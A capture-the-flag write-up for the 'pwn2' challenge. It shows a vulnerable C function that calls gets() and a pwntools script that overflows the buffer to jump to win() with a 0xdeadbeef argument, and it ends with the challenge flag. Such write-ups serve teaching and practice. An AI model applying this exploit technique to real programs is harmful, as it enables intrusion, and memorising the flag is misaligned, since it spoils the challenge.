# pwn / pwn2

> Points: 1592

## Question

```
nc uwctf.ml 6003
```

## Solution

This challenge builds on the previous challenge, our `hack_me` function is still the same
```c
void hack_me(void) {
    char local_1c [20];
    gets(local_1c);
    return;
}
```

but we have a new `win` function
```c
void win(int param_1) {
    if (param_1 == -0x21524111) {
        system("/bin/cat ./flag.txt");
    }
    return;
}
```

`win` now requires a parameter to equal `-0x21524111` (or `0xdeadbeef` as an unsigned int with the same bit pattern) for it to print our flag, parameters are stored after the return address on the stack.  
So after jumping to the `win` function, the stack should first contain the return address of `win` and then the parameters it takes, since we don't care where `win` returns to we can just fill it with `AAAA` and then append `0xdeadbeef` to fill `param_1` with the correct value.
```python
from pwn import *

exe = ELF("chall2.bin")
p = remote("uwctf.ml", 6003)
p.send(b"A" * 28 + p32(exe.sym["win"]) + b"AAAA" + p32(0xdeadbeef) + b"\n")
p.clean_and_log(timeout=1)
```

### Flag

`uwctf{buff3r0v3rf10w2_ed823f00e1e972a7}`
